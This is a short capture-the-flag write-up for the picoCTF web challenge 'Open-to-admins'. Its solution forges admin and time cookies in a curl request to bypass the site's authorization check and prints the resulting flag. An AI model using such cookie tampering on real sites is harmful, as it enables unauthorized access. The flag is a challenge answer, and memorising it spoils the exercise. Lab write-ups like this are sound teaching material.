# Open-to-admins
Web Exploitation, 200 points

## Description:
> This secure website allows users to access the flag only if they are admin and if the time is exactly 1400. 


## Solution: 

We can provide the requested values using cURL:
```console
root@kali:/media/sf_CTFs/pico/Open-to-admins# curl "https://2019shell1.picoctf.com/problem/12276/flag" -H "Cookie: time=1400; admin=True;" -s | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{0p3n_t0_adm1n5_bb42f2e0}</code></p>
```
